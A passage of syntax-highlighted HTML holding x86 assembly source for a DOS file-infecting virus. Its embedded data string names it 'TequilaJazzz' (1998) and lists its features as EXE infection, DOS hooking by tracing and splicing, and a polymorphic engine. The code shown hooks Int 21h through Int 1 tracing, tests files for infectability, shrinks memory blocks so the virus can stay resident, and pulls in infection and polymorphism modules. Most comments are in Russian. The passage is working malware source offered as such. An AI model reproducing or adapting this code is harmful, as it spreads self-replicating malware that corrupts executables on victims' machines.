        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0300h</span><span class="sc0">      </span><span class="sc1">; DOS ?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">ItsDOS</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C800h</span><span class="sc0">     </span><span class="sc1">; Hi DOS ?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">@return</span><span class="sc0">
</span><span class="sc5">ItsDOS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RealInt21</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">; Настоящий Int 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RealInt21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">OutInInt1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">DOSInt1</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Flags</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc5">TrF</span><span class="sc0">   </span><span class="sc1">; Сбросим TF</span><span class="sc0">
</span><span class="sc5">@return</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;──────────────────</span><span class="sc0">
</span><span class="sc5">RestoreJump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TraceCounter</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">TraceCounter</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">@return</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExchangeDOS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">TraceCounter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TrRET</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OutInINT1</span><span class="sc0">
</span><span class="sc5">TeqJazInt1</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;───────────────────</span><span class="sc0">
</span><span class="sc5">CopyPath</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; Копирование пути</span><span class="sc0">
</span><span class="sc1">; DS:DX - источник</span><span class="sc0">
</span><span class="sc1">; ES:DI - приемник если CF=1</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">UnDefine</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">     </span><span class="sc1">; В путь ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TeqFilePath</span><span class="sc0">
</span><span class="sc5">UnDefine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">FindZero</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">FindZero</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">NotPath</span><span class="sc0">       </span><span class="sc1">; Вместо пути подсунули какое то гавно</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">EndDir</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">CopyDir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">EndDir</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">EndDir</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CopyDir</span><span class="sc0">
</span><span class="sc5">NotPath</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CopyPath</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;───────────────────</span><span class="sc0">
</span><span class="sc5">AddFileName</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; Присоединение имени файла</span><span class="sc0">
</span><span class="sc1">; DS:SI - имя файла</span><span class="sc0">
</span><span class="sc1">; ES: - сегмент заранее !!! скопированного пути</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">
</span><span class="sc5">EndDir</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">CopyName</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CopyName</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AddFileName</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;───────────────────</span><span class="sc0">
</span><span class="sc5">TestPath</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; DS:DX - путь с тестируемым файлом</span><span class="sc0">
</span><span class="sc1">; ZF=0 - Незаражаемый файл</span><span class="sc0">
</span><span class="sc1">; ZF=1 - Заражаемый файл</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">FndZero</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">FndZero</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">  </span><span class="sc1">; Без расширения или с коротким</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FailurePath</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DFDFh</span><span class="sc0">      </span><span class="sc1">; приводим к верхнему регистру</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'XE'</span><span class="sc0">        </span><span class="sc1">; EXE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FailurePath</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'VO'</span><span class="sc0">        </span><span class="sc1">; OVL/OVR</span><span class="sc0">
</span><span class="sc5">FailurePath</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TestPath</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;───────────────────</span><span class="sc0">
</span><span class="sc5">ExchangeDOS</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RealInt21</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc5">DOSbytes</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">DOSbytes</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">OldDOSbytes</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldDOSbytes</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ExchangeDOS</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;───────────────────</span><span class="sc0">
</span><span class="sc5">DOS</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExchangeDOS</span><span class="sc0">   </span><span class="sc1">; Восстановим старые DOS'овские байтики</span><span class="sc0">
</span><span class="sc5">DOS</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;───────────────────</span><span class="sc0">
</span><span class="sc5">TraceDOS</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">            </span><span class="sc1">; Ставим Int 1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TeqJazInt1</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DOSInt1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Set Trace Flag</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">TrF</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9Ah</span><span class="sc0">       </span><span class="sc1">; К папочке...</span><span class="sc0">
</span><span class="sc5">RealInt21</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TraceDOS</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────</span><span class="sc0">
</span><span class="sc9">Include</span><span class="sc0">     </span><span class="sc5">teqdemo.asm</span><span class="sc0">    </span><span class="sc1">; Includes...</span><span class="sc0">
</span><span class="sc9">Include</span><span class="sc0">     </span><span class="sc5">phantom.asm</span><span class="sc0">
</span><span class="sc9">Include</span><span class="sc0">     </span><span class="sc5">trash.asm</span><span class="sc0">
</span><span class="sc9">Include</span><span class="sc0">     </span><span class="sc5">uepinf.asm</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────</span><span class="sc0">
</span><span class="sc5">ReAllocateMEM</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; Предполагается что блок уже измененяться прграммой не будет</span><span class="sc0">
</span><span class="sc1">; ZF=1 - Удачно обрезали блок</span><span class="sc0">
</span><span class="sc1">; ZF=0 - неудачно</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TequilaJiD</span><span class="sc0"> </span><span class="sc1">; Идентификатор распределенности блока</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LenOfBlOK</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Длинна блока</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">MCBSign</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Realloc</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0F0h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Перераспределено нами ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DontReAlloc</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0F4h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">; Кто то изменял уже</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DontReAlloc</span><span class="sc0">      </span><span class="sc1">; после нас</span><span class="sc0">
</span><span class="sc5">Realloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0F0h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Установим</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0F4h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; Новая длинна блока</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">DontReAlloc</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ReAllocateMEM</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;────────────── TequilaJazzz Data Area ────────────────</span><span class="sc0">

</span><span class="sc5">ProcAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Generation</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Work</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">flags</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OldBytes</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">9090h</span><span class="sc0">
</span><span class="sc5">TeqCopyID</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LenPreparePart</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RELOFFS</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DEST_CODE</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">COUNTER</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TARGETPLACE</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LENDECRYPTOR</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">TequilaInfo</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'VirName     : TequilaJazzz'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Author      : DaemonSerJ'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Copyleft    : (C) 1998 Russia,Nsk,NSTU'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'HookDOS     : Trace , Splice'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Memory      : LowMEM'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Infect      : UEP.EXE.Infecting'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Polymorph   : DirectPhantom v2.1'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'AttackSpeed : Fast'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
